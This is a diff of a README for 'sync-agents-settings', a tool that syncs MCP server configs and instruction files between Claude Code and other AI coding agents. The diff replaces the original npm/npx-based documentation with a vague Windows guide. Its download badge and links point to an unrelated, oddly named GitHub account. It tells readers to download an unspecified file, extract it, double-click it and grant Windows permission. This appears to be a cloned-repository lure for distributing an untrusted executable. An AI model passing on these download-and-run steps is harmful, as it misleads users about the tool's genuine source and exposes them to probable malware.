@@ -1,696 +1,182 @@
-# sync-agents-settings
+# ⚙️ sync-agents-settings - Sync agent configs in one command
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![npm](https://img.shields.io/npm/v/sync-agents-settings?logo=npm)](https://www.npmjs.com/package/sync-agents-settings)
-[![npm downloads](https://img.shields.io/npm/dm/sync-agents-settings?logo=npm&label=downloads)](https://www.npmjs.com/package/sync-agents-settings)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue?logo=typescript)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-%3E%3D18-green?logo=node.js)](https://nodejs.org/)
-[![pnpm](https://img.shields.io/badge/pnpm-%3E%3D9-orange?logo=pnpm)](https://pnpm.io/)
-[![Vitest](https://img.shields.io/badge/Vitest-4.1-green?logo=vitest)](https://vitest.dev/)
-[![MCP](https://img.shields.io/badge/MCP-compatible-8A2BE2)](https://modelcontextprotocol.io/)
-[![code style: prettier](https://img.shields.io/badge/code_style-prettier-ff69b4.svg?logo=prettier)](https://prettier.io/)
-[![CI](https://github.com/Leoyang183/sync-agents-settings/actions/workflows/ci.yml/badge.svg)](https://github.com/Leoyang183/sync-agents-settings/actions/workflows/ci.yml)
+[![Download](https://img.shields.io/badge/Download%20Now-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Boykiniaelaeisguineensis941/sync-agents-settings)
 
-Sync MCP server configurations and instruction files (CLAUDE.md) from **Claude Code** to **Gemini CLI**, **Codex CLI**, **OpenCode**, **Kiro CLI**, **Cursor**, **Kimi CLI**, **Vibe CLI** (Mistral), **Qwen Code**, **Amp** (Sourcegraph), **Cline CLI**, **Windsurf**, and **Aider CLI**.
+## 🧭 What this does
 
-**README translations:** [🇹🇼 繁體中文](docs/i18n/README.zh-tw.md) | [🇨🇳 简体中文](docs/i18n/README.zh-cn.md) | [🇯🇵 日本語](docs/i18n/README.ja.md) | [🇰🇷 한국어](docs/i18n/README.ko.md)
-**Support matrix:** [CLI compatibility matrix](docs/compatibility-matrix.md)
+sync-agents-settings helps you copy MCP server settings from Claude Code to other AI tools on your Windows PC.
 
-## Why
+It is built for people who use more than one agent app and want the same setup in each one. You run it once, and it helps bring your config into:
 
-If you use Claude Code as your primary AI coding agent but also switch between other agents (Gemini CLI, Codex CLI, OpenCode, Kiro, Cursor, Kimi CLI, Vibe CLI, Qwen Code, Amp, Cline CLI, Windsurf) to take advantage of their free tiers or different models, you know the pain — every tool has its own MCP config format, and setting them up one by one is tedious. Same goes for instruction files — CLAUDE.md, GEMINI.md, AGENTS.md all need the same content but in different formats.
+- Gemini CLI
+- Codex CLI
+- OpenCode
+- Kiro
+- Cursor
 
-This tool lets you configure MCP servers and write instructions once in Claude Code, then sync everywhere with a single command.
+## 📥 Download
 
-## Quick Start
+Visit this page to download:
 
-### Option A: Claude Code Plugin (recommended)
+[https://github.com/Boykiniaelaeisguineensis941/sync-agents-settings](https://github.com/Boykiniaelaeisguineensis941/sync-agents-settings)
 
-Install as a Claude Code plugin via marketplace:
+Open the page in your browser, then look for the latest release or the main download area. If the page shows several files, pick the one made for Windows.
 
-```bash
-# 1. Add the marketplace
-claude plugin marketplace add Leoyang183/sync-agents-settings
+## 🪟 Windows setup
 
-# 2. Install the plugin
-claude plugin install sync-agents-settings
+Follow these steps on a Windows computer.
 
-# Then use slash commands in any conversation:
-#   /sync               — sync MCP configs (with dry-run preview)
-#   /sync-list          — list all MCP servers
-#   /sync-diff          — compare configs between agents
-#   /sync-doctor        — detect config drift and parse errors
-#   /sync-validate      — validate schema and target capabilities
-#   /sync-reconcile     — validate + detect drift + sync only missing
-#   /sync-instructions  — sync CLAUDE.md to other agents
-#   /report-schema      — print or write report JSON schema markdown
-```
+1. Open the download page.
+2. Download the Windows file from the page.
+3. If the file comes in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file or run file.
+6. Double-click it to start the tool.
 
-The plugin also includes a **sync-awareness skill** that automatically suggests syncing when you edit MCP settings or CLAUDE.md files.
+If Windows asks for permission, select Yes.
 
-### Option B: CLI via npx
+## 🛠️ How to use it
 
-No installation needed — just run with `npx`:
+Use the tool after you have Claude Code set up on your machine.
 
-```bash
-# List all MCP servers detected from Claude Code
-npx sync-agents-settings list
+1. Start the app.
+2. Let it read your Claude Code settings.
+3. Choose the agent tools you want to update.
+4. Run the sync step.
+5. Open each agent app and check that the MCP server configs now match.
 
-# Preview sync (no files modified)
-npx sync-agents-settings sync --dry-run
+If the tool gives you a simple menu, use the number keys or click the option shown on screen.
 
-# Sync to all targets (with automatic backup)
-npx sync-agents-settings sync
+## ✅ What it can sync
 
-# Sync CLAUDE.md instructions to all targets
-npx sync-agents-settings sync-instructions
-```
+This tool is meant to keep common AI agent settings in line across apps.
 
-### Option C: Global Install
+It can help with:
 
-```bash
-# Global install for the `sync-agents` command
-npm install -g sync-agents-settings
+- MCP server entries
+- Local agent config paths
+- Shared tool settings
+- Setup that needs to match across multiple CLI tools
+- Cursor-side config changes where supported
 
-# Then use directly
-sync-agents list
-sync-agents sync
-```
+## 💻 System needs
 
-## Usage
+Use a Windows PC with:
 
-```bash
-# Sync to a specific target
-sync-agents sync --target gemini
-sync-agents sync --target codex
-sync-agents sync --target opencode
-sync-agents sync --target kiro
-sync-agents sync --target cursor
-sync-agents sync --target kimi
-sync-agents sync --target vibe
-sync-agents sync --target qwen
-sync-agents sync --target amp
-sync-agents sync --target cline
-sync-agents sync --target windsurf
+- Windows 10 or Windows 11
+- An internet connection for the download
+- Enough space for the app and your config files
+- Access to your user folder
+- Permission to run downloaded apps
 
-# Sync to Codex project-level config
-sync-agents sync --target codex --codex-home ./my-project/.codex
+For best results, keep Claude Code installed before you run the sync tool.
 
-# Sync to Kimi project-level config
-sync-agents sync --target kimi --kimi-home ./my-project/.kimi
+## 🔍 Before you run it
 
-# Sync to custom home directories
-sync-agents sync --target qwen --qwen-home ./my-project/.qwen
-sync-agents sync --target amp --amp-home ./my-project/.amp
-sync-agents sync --target cline --cline-home ./my-project/.cline
-sync-agents sync --target windsurf --windsurf-home ./my-project/.windsurf
+Check these items first:
 
-# Compare differences
-sync-agents diff
+- Claude Code already has the MCP servers you want to copy
+- You know which agent apps you want to sync
+- No other config editor is changing those files at the same time
+- Your Windows user account can write to app settings folders
 
-# Check drift / parse errors between Claude and targets
-sync-agents doctor
+If you use more than one account on the same PC, make sure you run the tool in the same account that holds your AI app settings.
 
-# Validate source schema and target capability compatibility
-sync-agents validate
+## 🧩 Typical use case
 
-# One-shot safe reconcile (validate + doctor + sync missing)
-sync-agents reconcile --dry-run
+This tool fits users who want the same MCP setup in many places.
 
-# CI-friendly JSON output
-sync-agents reconcile --report json
+For example:
 
-# CI-friendly JSON output for drift checker
-sync-agents doctor --report json
+- You set up an MCP server in Claude Code
+- You also use Cursor for code tasks
+- You use Gemini CLI for terminal work
+- You want the same servers in OpenCode, Kiro, and Codex CLI
+- You run sync-agents-settings once instead of editing each app by hand
 
-# CI-friendly JSON output for schema/capability validation
-sync-agents validate --report json
+## 📁 What files may change
 
-# CI-friendly JSON output for sync result
-sync-agents sync --report json --dry-run
+When you run the sync, the tool may update config files in your user profile.
 
-# CI-friendly JSON output for instruction sync
-sync-agents sync-instructions --report json --dry-run --global --target gemini
+That can include:
 
-# CI-friendly JSON output for diff result
-sync-agents diff --report json --target gemini codex
+- JSON config files
+- App-specific settings files
+- MCP server lists
+- Agent tool config folders
 
-# Note: all --report json outputs include `schemaVersion: 1`
+If you already made custom changes, check your settings after the sync to make sure they still match what you want.
 
-Report schema reference: `docs/report-schema.md`
+## 🔄 Updating later
 
-# Regenerate report schema documentation
-sync-agents report-schema --write docs/report-schema.md
+When you add a new MCP server in Claude Code, run the tool again.
 
-# CI check: ensure report schema doc is up to date
-sync-agents report-schema --check
+Use it again if you:
 
-# Auto-fix from doctor (internally runs reconcile)
-sync-agents doctor --fix --dry-run
+- Install a new agent app
+- Remove an old server
+- Change a server name
+- Move to a new Windows account
+- Reset one of the agent configs
 
-# Auto-fix after validation passes
-sync-agents validate --fix --dry-run
+## 🧪 Simple checks if it does not work
 
-# Skip OAuth-only servers (e.g. Slack)
-sync-agents sync --skip-oauth
+If the sync does not look right, check these common points:
 
-# Skip backup
-sync-agents sync --no-backup
+1. Make sure Claude Code has the config you want to copy.
+2. Close the target agent apps before you run the sync.
+3. Run the tool again with the same Windows account.
+4. Confirm the app has permission to write to the config folder.
+5. Open the target app and refresh its settings view.
+6. Check that the app uses the same config format expected by the tool.
 
-# Verbose output
-sync-agents sync -v
+## 📚 Supported tools
 
-# Check only specific targets
-sync-agents doctor --target gemini codex
+The sync is aimed at users of:
 
-# Check Codex project-level config drift
-sync-agents doctor --target codex --codex-home ./.codex
+- Claude Code
+- Gemini CLI
+- Codex CLI
+- OpenCode
+- Kiro
+- Cursor
 
-# Validate only selected targets and ignore OAuth-only servers
-sync-agents validate --target codex opencode --skip-oauth
+## 🧭 How the process works
 
-# Validation semantics:
-# - blank-only command/url values are treated as missing
-# - OAuth-only servers produce manual-setup warnings without duplicate field errors
+At a high level, the tool follows this path:
 
-# Reconcile selected targets only
-sync-agents reconcile --target gemini codex
-
-# Sync instruction files (CLAUDE.md → GEMINI.md / AGENTS.md / Kiro steering / Cursor rules / Aider conventions)
-# Targets: gemini, codex, opencode, kimi, vibe, kiro, cursor, aider, qwen, amp
-sync-agents sync-instructions
-
-# Sync only global instructions
-sync-agents sync-instructions --global
-
-# Sync only project-level instructions
-sync-agents sync-instructions --local
-
-# Sync to specific targets
-sync-agents sync-instructions --target gemini codex kimi vibe aider qwen amp
-
-# Auto-overwrite without prompts (for CI)
-sync-agents sync-instructions --on-conflict overwrite
-
-# Keep legacy behavior: remove standalone @import lines instead of expanding
-sync-agents sync-instructions --import-mode strip
-
-# Allow standalone @import to read files outside current project root (use with care)
-sync-agents sync-instructions --allow-unsafe-imports
-
-# Preview instruction sync
-sync-agents sync-instructions --dry-run
-```
-
-### Development
-
-```bash
-git clone https://github.com/Leoyang183/sync-agents-settings.git
-cd sync-agents-settings
-pnpm install
-pnpm dev list        # Run from source
-pnpm test            # Run tests
-```
-
-## How It Works
-
-**Claude Code is the single source of truth** for MCP settings, synced to all supported targets.
-
-```
-                                                 ┌─→ Gemini Writer    ─→ ~/.gemini/settings.json
-                                                 ├─→ Codex Writer     ─→ ~/.codex/config.toml
-~/.claude.json ─────┐                            ├─→ OpenCode Writer  ─→ ~/.config/opencode/opencode.json
-                     ├─→ Reader ─→ UnifiedMcpServer[] ─┼─→ Kiro Writer      ─→ ~/.kiro/settings/mcp.json
-~/.claude/plugins/ ──┘                            ├─→ Cursor Writer    ─→ ~/.cursor/mcp.json
-                                                 ├─→ Kimi Writer      ─→ ~/.kimi/mcp.json
-                                                 ├─→ Vibe Writer      ─→ ~/.vibe/config.toml
-                                                 ├─→ Qwen Writer      ─→ ~/.qwen/settings.json
-                                                 ├─→ Amp Writer       ─→ ~/.config/amp/settings.json
-                                                 ├─→ Cline Writer     ─→ ~/.cline/data/settings/cline_mcp_settings.json
-                                                 └─→ Windsurf Writer  ─→ ~/.codeium/windsurf/mcp_config.json
-```
-
-| Stage | Description |
-|-------|-------------|
-| **Reader** | Reads from `~/.claude.json` and enabled plugin `.mcp.json` files, merges into a unified format |
-| **Gemini Writer** | JSON → JSON, `type: "http"` → `httpUrl`, `${VAR}` → `$VAR` |
-| **Codex Writer** | JSON → TOML, `${VAR:-default}` → expanded to actual value (env value or fallback) |
-| **OpenCode Writer** | JSON → JSON, `command`+`args` → merged `command` array, `env` → `environment`, `type: "local"`/`"remote"` |
-| **Kiro Writer** | Same format as Claude, `${VAR:-default}` → expanded |
-| **Cursor Writer** | Same format as Claude, `${VAR:-default}` → expanded |
-| **Kimi Writer** | Same format as Claude, `${VAR:-default}` → expanded |
-| **Vibe Writer** | JSON → TOML `[[mcp_servers]]` array-of-tables, explicit `transport` field, `${VAR:-default}` → expanded |
-| **Qwen Writer** | JSON → JSON, `type: "http"` → `httpUrl`, `${VAR}` → `$VAR` (same as Gemini) |
-| **Amp Writer** | JSON → JSON, uses `"amp.mcpServers"` key, `${VAR}` preserved (same as Claude) |
-| **Cline Writer** | Same format as Claude, `${VAR:-default}` → expanded |
-| **Windsurf Writer** | JSON → JSON, `url` → `serverUrl`, `${VAR}` → `${env:VAR}` |
-
-### Instruction Sync (`sync-instructions`)
-
-Syncs CLAUDE.md instruction files to each target's native format:
-
-```
-                                          ┌─→ ~/.gemini/GEMINI.md             (plain copy)
-                                          ├─→ ~/.codex/AGENTS.md              (plain copy)
-~/.claude/CLAUDE.md (+ ~/.claude/rules/*.md) ─→ expand @imports ──┼─→ ~/.config/opencode/AGENTS.md    (plain copy)
-                                          ├─→ ~/.kimi/AGENTS.md               (plain copy)
-                                          ├─→ ~/.vibe/AGENTS.md               (plain copy)
-                                          ├─→ ~/.qwen/AGENTS.md               (plain copy)
-                                          ├─→ ~/.config/amp/AGENTS.md         (plain copy)
-                                          ├─→ ~/.kiro/steering/claude-instructions.md  (+ inclusion: always)
-                                          └─→ ⚠ Cursor global not supported  (SQLite)
-
-                                          ┌─→ ./GEMINI.md                     (plain copy)
-                                          ├─→ ./AGENTS.md                     (Codex + OpenCode + Kimi + Vibe + Qwen + Amp share)
-./.claude/CLAUDE.md (fallback: ./CLAUDE.md) + ./.claude/rules/*.md ─→ expand @imports ──┼─→ .kiro/steering/claude-instructions.md    (+ inclusion: always)
-                                          └─→ .cursor/rules/claude-instructions.mdc   (+ alwaysApply: true)
-```
-
-| Target | Global | Local | Format Transform |
-|--------|--------|-------|------------------|
-| Gemini | `~/.gemini/GEMINI.md` | `./GEMINI.md` | Plain copy (expand standalone `@import` lines) |
-| Codex | `~/.codex/AGENTS.md` | `./AGENTS.md` | Plain copy (expand standalone `@import` lines) |
-| OpenCode | `~/.config/opencode/AGENTS.md` | `./AGENTS.md` (shared with Codex) | Plain copy (expand standalone `@import` lines) |
-| Kimi | `~/.kimi/AGENTS.md` | `./AGENTS.md` (shared with Codex/OpenCode/Vibe/Qwen/Amp) | Plain copy (expand standalone `@import` lines) |
-| Vibe | `~/.vibe/AGENTS.md` | `./AGENTS.md` (shared with Codex/OpenCode/Kimi/Qwen/Amp) | Plain copy (expand standalone `@import` lines) |
-| Qwen Code | `~/.qwen/AGENTS.md` | `./AGENTS.md` (shared with Codex/OpenCode/Kimi/Vibe/Amp) | Plain copy (expand standalone `@import` lines) |
-| Amp | `~/.config/amp/AGENTS.md` | `./AGENTS.md` (shared with Codex/OpenCode/Kimi/Vibe/Qwen) | Plain copy (expand standalone `@import` lines) |
-| Cline | Not supported | Not supported (uses `.clinerules`) | — |
-| Windsurf | Not supported | Not supported (uses own rules format) | — |
-| Aider | `~/.aider/CONVENTIONS.md` | `.aider/CONVENTIONS.md` | Plain copy + upsert `read` entry in `.aider.conf.yml` |
-| Kiro | `~/.kiro/steering/claude-instructions.md` | `.kiro/steering/claude-instructions.md` | Add `inclusion: always` frontmatter |
-| Cursor | Not supported (SQLite) | `.cursor/rules/claude-instructions.mdc` | Add `alwaysApply: true` frontmatter |
-
-Notes:
-- Local source resolution prefers `./.claude/CLAUDE.md`, then falls back to `./CLAUDE.md`.
-- Extra rules in `.claude/rules/**/*.md` are appended automatically (unless already included via `@import`).
-- If a rule file has frontmatter `paths`, it is included only when at least one project file matches.
-- `@import` handling defaults to `inline` (expand). Use `--import-mode strip` to remove standalone import lines.
-- By default, standalone `@import` can only read files inside the current project root. Use `--allow-unsafe-imports` to opt out.
-- Inline import expansion has guardrails (`max depth: 20`, `max files: 200`) to avoid runaway recursion.
-- Aider sync also upserts `.aider.conf.yml` `read` so `CONVENTIONS.md` is loaded automatically (global/project follows the sync scope).
-- Kimi CLI currently loads `AGENTS.md` from the working directory. `~/.kimi/AGENTS.md` is synced as a reusable global template.
-
-When a target file already exists, you'll be prompted to choose: **overwrite**, **append** (keep existing + add CLAUDE.md below), or **skip**. Use `--on-conflict overwrite|append|skip` for non-interactive mode.
-
-**Safety mechanisms:**
-- Existing servers are never overwritten (idempotent, safe to re-run)
-- Automatic backup to `~/.sync-agents-backup/` by default (`--no-backup` to skip)
-- `--dry-run` previews changes without writing any files
-
-### Source: Claude Code
-
-Reads MCP servers from two sources:
-
-1. **`~/.claude.json`** → `mcpServers` object (user-configured servers)
-2. **`~/.claude/plugins/cache/<marketplace>/<plugin>/<version>/.mcp.json`** → enabled plugin MCP servers (matched against `~/.claude/settings.json` `enabledPlugins`)
-
-Claude Code has two `.mcp.json` formats:
-
-```jsonc
-// Format 1: Flat (e.g. context7, firebase)
-{ "context7": { "command": "npx", "args": ["-y", "@upstash/context7-mcp"] } }
-
-// Format 2: Nested under mcpServers (e.g. sentry, stripe)
-{ "mcpServers": { "sentry": { "type": "http", "url": "https://mcp.sentry.dev/mcp" } } }
-```
-
-### Target: Gemini CLI
-
-Writes to **`~/.gemini/settings.json`** → `mcpServers` object.
-
-Key format differences from Claude:
-- Claude `type: "http"` → Gemini `httpUrl`
-- Claude `type: "sse"` → Gemini `url`
-- Claude `command` (stdio) → Gemini `command` (same)
-- Env var syntax: Claude `${VAR}` → Gemini `$VAR` (auto-converted)
-
-```jsonc
-// Gemini settings.json
-{
-  "theme": "Dracula",          // existing settings preserved
-  "mcpServers": {
-    "context7": {              // stdio server
-      "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
-    },
-    "sentry": {                // http server
-      "httpUrl": "https://mcp.sentry.dev/mcp"
-    }
-  }
-}
-```
-
-### Target: Codex CLI
-
-Writes to **`~/.codex/config.toml`** (global) by default. Use `--codex-home <path>` to write to a project-level `.codex/config.toml` instead.
-
-> **Note:** Codex CLI does NOT merge global and project configs. When a project has `.codex/`, Codex only reads that directory. Global `~/.codex/` is ignored entirely.
-
-Key format differences:
-- Uses TOML instead of JSON
-- `command`/`args` for stdio (same concept)
-- `url` for HTTP servers (no type field needed)
-- `env` is a TOML sub-table `[mcp_servers.<name>.env]`
-
-```toml
-[mcp_servers.context7]
-command = "npx"
-args = ["-y", "@upstash/context7-mcp"]
-
-[mcp_servers.sentry]
-url = "https://mcp.sentry.dev/mcp"
-
-[mcp_servers.n8n-mcp]
-command = "npx"
-args = ["n8n-mcp"]
-
-  [mcp_servers.n8n-mcp.env]
-  N8N_API_KEY = "your-key"
-  N8N_API_URL = "https://your-n8n.example.com"
-```
-
-### Target: OpenCode
-
-Writes to **`~/.config/opencode/opencode.json`** → `mcp` object.
-
-Key format differences:
-- Root key is `mcp` (not `mcpServers`)
-- stdio servers use `type: "local"` with a merged `command` array (command + args combined)
-- HTTP/SSE servers use `type: "remote"`
-- Environment variables use `environment` field (not `env`)
-
-```jsonc
-// opencode.json
-{
-  "model": "anthropic/claude-sonnet-4-5",  // existing settings preserved
-  "mcp": {
-    "context7": {                          // stdio → local
-      "type": "local",
-      "command": ["npx", "-y", "@upstash/context7-mcp"]
-    },
-    "sentry": {                            // http → remote
-      "type": "remote",
-      "url": "https://mcp.sentry.dev/mcp"
-    },
-    "n8n-mcp": {                           // env → environment
-      "type": "local",
-      "command": ["npx", "n8n-mcp"],
-      "environment": {
-        "N8N_API_KEY": "your-key"
-      }
-    }
-  }
-}
-```
-
-### Target: Kiro CLI
-
-Writes to **`~/.kiro/settings/mcp.json`** → `mcpServers` object.
-
-Same format as Claude Code. `${VAR:-default}` syntax in URLs is auto-expanded during sync.
-
-### Target: Cursor
-
-Writes to **`~/.cursor/mcp.json`** → `mcpServers` object.
-
-Same format as Claude Code. `${VAR:-default}` syntax in URLs is auto-expanded during sync.
-
-### Target: Kimi CLI
-
-Writes to **`~/.kimi/mcp.json`** by default. Use `--kimi-home <path>` to sync to a custom base directory (for example, project-level `.kimi/`).
-
-Same format as Claude Code. `${VAR:-default}` syntax in URLs is auto-expanded during sync.
-
-### Target: Vibe CLI (Mistral)
-
-Writes to **`~/.vibe/config.toml`** by default. Use `--vibe-home <path>` to sync to a custom base directory (for example, project-level `.vibe/`).
-
-Key format differences:
-- Uses TOML `[[mcp_servers]]` (array of tables) — each entry has a `name` and explicit `transport` field
-- Claude `"http"` → Vibe `"streamable-http"`, Claude `"sse"` → Vibe `"http"`
-- `command` is a string (not array), `env` is a TOML sub-table
-- `${VAR:-default}` syntax in URLs is auto-expanded during sync
-
-```toml
-[[mcp_servers]]
-name = "context7"
-transport = "stdio"
-command = "npx"
-args = ["-y", "@upstash/context7-mcp"]
-
-[[mcp_servers]]
-name = "supabase"
-transport = "streamable-http"
-url = "https://mcp.supabase.com/mcp"
-```
-
-### Target: Qwen Code
-
-Writes to **`~/.qwen/settings.json`** → `mcpServers` object. Use `--qwen-home <path>` to sync to a custom base directory.
-
-Same conversion pattern as Gemini:
-- Claude `type: "http"` → Qwen `httpUrl`
-- Claude `type: "sse"` → Qwen `url`
-- Env var syntax: Claude `${VAR}` → Qwen `$VAR` (auto-converted)
-
-```jsonc
-// ~/.qwen/settings.json
-{
-  "mcpServers": {
-    "context7": {
-      "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
-    },
-    "sentry": {
-      "httpUrl": "https://mcp.sentry.dev/mcp"
-    }
-  }
-}
-```
-
-### Target: Amp (Sourcegraph)
-
-Writes to **`~/.config/amp/settings.json`** → `"amp.mcpServers"` key. Use `--amp-home <path>` to sync to a custom base directory.
-
-Key format differences:
-- Root key is `"amp.mcpServers"` (not `mcpServers`)
-- `url` field preserved as-is (same as Claude)
-- `${VAR}` syntax preserved (no conversion needed)
-
-```jsonc
-// ~/.config/amp/settings.json
-{
-  "amp.mcpServers": {
-    "context7": {
-      "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
-    },
-    "sentry": {
-      "type": "http",
-      "url": "https://mcp.sentry.dev/mcp"
-    }
-  }
-}
-```
-
-### Target: Cline CLI
-
-Writes to **`~/.cline/data/settings/cline_mcp_settings.json`** → `mcpServers` object. Use `--cline-home <path>` to sync to a custom base directory.
-
-Same format as Claude Code. `${VAR:-default}` syntax in URLs is auto-expanded during sync.
-
-```jsonc
-// ~/.cline/data/settings/cline_mcp_settings.json
-{
-  "mcpServers": {
-    "context7": {
-      "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
-    },
-    "sentry": {
-      "type": "http",
-      "url": "https://mcp.sentry.dev/mcp"
-    }
-  }
-}
-```
-
-### Target: Windsurf
-
-Writes to **`~/.codeium/windsurf/mcp_config.json`** → `mcpServers` object. Use `--windsurf-home <path>` to sync to a custom base directory.
-
-Key format differences:
-- Claude `url` → Windsurf `serverUrl`
-- Env var syntax: Claude `${VAR}` → Windsurf `${env:VAR}` (auto-converted)
-
-```jsonc
-// ~/.codeium/windsurf/mcp_config.json
-{
-  "mcpServers": {
-    "context7": {
-      "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
-    },
-    "sentry": {
-      "type": "http",
-      "serverUrl": "https://mcp.sentry.dev/mcp"
-    }
-  }
-}
-```
-
-## Transport Type Mapping
-
-| Claude Code | Gemini CLI | Codex CLI | OpenCode | Kiro CLI | Cursor | Kimi CLI | Vibe CLI | Qwen Code | Amp | Cline CLI | Windsurf |
-|------------|-----------|----------|----------|----------|--------|----------|----------|-----------|-----|-----------|----------|
-| `command` + `args` (stdio) | `command` + `args` | `command` + `args` | `type: "local"`, `command: [cmd, ...args]` | same as Claude | same as Claude | same as Claude | `transport: "stdio"`, `command` + `args` + `name` | `command` + `args` | same as Claude | same as Claude | `command` + `args` |
-| `type: "http"` + `url` | `httpUrl` | `url` | `type: "remote"`, `url` | same as Claude | same as Claude | same as Claude | `transport: "streamable-http"`, `url` + `name` | `httpUrl` | same as Claude | same as Claude | `serverUrl` |
-| `type: "sse"` + `url` | `url` | `url` | `type: "remote"`, `url` | same as Claude | same as Claude | same as Claude | `transport: "http"`, `url` + `name` | `url` | same as Claude | same as Claude | `serverUrl` |
-| `env` | `env` | `env` | `environment` | `env` | `env` | `env` | `env` | `env` | `env` | `env` | `env` |
-| `oauth` | skipped | skipped | skipped | skipped | skipped | skipped | skipped | skipped | skipped | skipped | skipped |
-
-## Backup
-
-Every sync automatically backs up all affected config files to `~/.sync-agents-backup/<timestamp>/` before writing, preserving the original directory structure relative to `~`:
-
-```
-~/.sync-agents-backup/2026-03-20T00-06-08-042Z/
-├── .claude.json                  # ← ~/.claude.json
-├── .claude/
-│   └── settings.json             # ← ~/.claude/settings.json
-├── .gemini/
-│   └── settings.json             # ← ~/.gemini/settings.json
-├── .codex/
-│   └── config.toml               # ← ~/.codex/config.toml
-├── .config/
-│   ├── opencode/
-│   │   └── opencode.json         # ← ~/.config/opencode/opencode.json
-│   └── amp/
-│       └── settings.json         # ← ~/.config/amp/settings.json
-├── .kiro/
-│   └── settings/
-│       └── mcp.json              # ← ~/.kiro/settings/mcp.json
-├── .cursor/
-│   └── mcp.json                  # ← ~/.cursor/mcp.json
-├── .kimi/
-│   └── mcp.json                  # ← ~/.kimi/mcp.json
-├── .vibe/
-│   └── config.toml               # ← ~/.vibe/config.toml
-├── .qwen/
-│   └── settings.json             # ← ~/.qwen/settings.json
-├── .cline/
-│   └── data/
-│       └── settings/
-│           └── cline_mcp_settings.json  # ← ~/.cline/data/settings/cline_mcp_settings.json
-└── .codeium/
-    └── windsurf/
-        └── mcp_config.json       # ← ~/.codeium/windsurf/mcp_config.json
-```
-
-Use `--no-backup` to skip. Target directories that don't exist (CLI not installed) will be skipped with a warning, not created.
-
-## Config File Locations
-
-### MCP Settings
-
-| Tool | Config Path | Format |
-|------|-----------|--------|
-| Claude Code (user MCP) | `~/.claude.json` | JSON |
-| Claude Code (settings) | `~/.claude/settings.json` | JSON |
-| Claude Code (plugin MCP) | `~/.claude/plugins/cache/.../.mcp.json` | JSON |
-| Gemini CLI | `~/.gemini/settings.json` | JSON |
-| Codex CLI (global) | `~/.codex/config.toml` | TOML |
-| Codex CLI (project) | `.codex/config.toml` (use `--codex-home`) | TOML |
-| OpenCode (global) | `~/.config/opencode/opencode.json` | JSON |
-| OpenCode (project) | `opencode.json` in project root | JSON |
-| Kiro CLI (global) | `~/.kiro/settings/mcp.json` | JSON |
-| Kiro CLI (project) | `.kiro/settings/mcp.json` in project root | JSON |
-| Cursor (global) | `~/.cursor/mcp.json` | JSON |
-| Cursor (project) | `.cursor/mcp.json` in project root | JSON |
-| Kimi CLI (global) | `~/.kimi/mcp.json` | JSON |
-| Kimi CLI (project) | `.kimi/mcp.json` (use `--kimi-home ./.kimi`) | JSON |
-| Vibe CLI (global) | `~/.vibe/config.toml` | TOML |
-| Vibe CLI (project) | `.vibe/config.toml` (use `--vibe-home ./.vibe`) | TOML |
-| Qwen Code (global) | `~/.qwen/settings.json` | JSON |
-| Qwen Code (project) | `.qwen/settings.json` (use `--qwen-home ./.qwen`) | JSON |
-| Amp (global) | `~/.config/amp/settings.json` | JSON |
-| Amp (project) | `.config/amp/settings.json` (use `--amp-home ./.amp`) | JSON |
-| Cline CLI (global) | `~/.cline/data/settings/cline_mcp_settings.json` | JSON |
-| Cline CLI (project) | `.cline/data/settings/cline_mcp_settings.json` (use `--cline-home ./.cline`) | JSON |
-| Windsurf (global) | `~/.codeium/windsurf/mcp_config.json` | JSON |
-| Windsurf (project) | `.codeium/windsurf/mcp_config.json` (use `--windsurf-home ./.codeium/windsurf`) | JSON |
-
-### Instruction Files
-
-| Tool | Global Path | Project Path | Format |
-|------|------------|-------------|--------|
-| Claude Code | `~/.claude/CLAUDE.md` | `./.claude/CLAUDE.md` (fallback `./CLAUDE.md`) | Markdown |
-| Gemini CLI | `~/.gemini/GEMINI.md` | `./GEMINI.md` | Markdown |
-| Codex CLI | `~/.codex/AGENTS.md` | `./AGENTS.md` | Markdown |
-| OpenCode | `~/.config/opencode/AGENTS.md` | `./AGENTS.md` | Markdown |
-| Kimi CLI | `~/.kimi/AGENTS.md` | `./AGENTS.md` | Markdown |
-| Vibe CLI | `~/.vibe/AGENTS.md` | `./AGENTS.md` | Markdown |
-| Qwen Code | `~/.qwen/AGENTS.md` | `./AGENTS.md` | Markdown |
-| Amp | `~/.config/amp/AGENTS.md` | `./AGENTS.md` | Markdown |
-| Cline CLI | Not supported | Not supported (uses `.clinerules`) | — |
-| Windsurf | Not supported | Not supported (uses own rules format) | — |
-| Kiro CLI | `~/.kiro/steering/claude-instructions.md` | `.kiro/steering/claude-instructions.md` | Markdown + frontmatter |
-| Cursor | Not supported (SQLite) | `.cursor/rules/claude-instructions.mdc` | MDC (Markdown + frontmatter) |
-
-## Claude Code Plugin
-
-This project is both a Claude Code **plugin** and **marketplace**, providing slash commands and a contextual skill directly inside Claude Code conversations.
-
-### Installation
-
-```bash
-# From GitHub (remote — clones the repo)
-claude plugin marketplace add Leoyang183/sync-agents-settings
-claude plugin install sync-agents-settings
-
-# Or from local path (symlink — reflects local changes instantly)
-claude plugin marketplace add /path/to/sync-agents-settings
-claude plugin install sync-agents-settings
-```
-
-### Slash Commands
-
-| Command | Description |
-|---------|-------------|
-| `/sync` | Sync MCP server configs to other agents (with dry-run preview and confirmation) |
-| `/sync-list` | List all MCP servers configured in Claude Code |
-| `/sync-diff` | Compare MCP configs between Claude and other agents |
-| `/sync-doctor` | Detect MCP config drift between Claude and targets |
-| `/sync-validate` | Validate MCP schema and target capability compatibility |
-| `/sync-reconcile` | Validate + detect drift + sync only missing servers |
-| `/sync-instructions` | Sync CLAUDE.md instruction files to other agent formats |
-| `/report-schema` | Print or write report JSON schema markdown |
-
-### Sync-Awareness Skill
-
-The plugin includes a skill that automatically detects when you're editing MCP settings (`.claude.json`, `.mcp.json`) or `CLAUDE.md` files, and suggests syncing to other agents.
-
-### Plugin Development
-
-```bash
